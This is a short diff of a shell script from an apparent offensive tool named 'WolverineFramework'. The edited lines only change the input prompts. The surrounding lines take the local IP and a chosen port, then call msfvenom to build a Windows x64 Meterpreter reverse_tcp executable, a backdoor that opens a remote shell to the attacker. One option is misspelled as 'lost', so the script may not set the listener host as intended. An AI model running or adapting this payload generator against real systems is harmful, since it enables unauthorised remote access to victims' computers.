@@ -4,9 +4,9 @@ lhost=$(hostname -I | awk '{print $1}')
     mkdir exeFiles
     echo "Your IP address is :" $lhost
     echo "Which port do you want to use ?"
-    read lport
+    read -p "WolverineFramework - Port> " lport
     echo "What name do you want to give to the .exe file ? (don't put .exe)"
-    read extension
+    read -p "WolverineFramework - File Name> " extension
     echo "Creating .exe file..."
     msfvenom -p windows/x64/meterpreter/reverse_tcp lost=$lhost lport=$lport -f exe > $extension.exe
     mv $extension.exe exeFiles
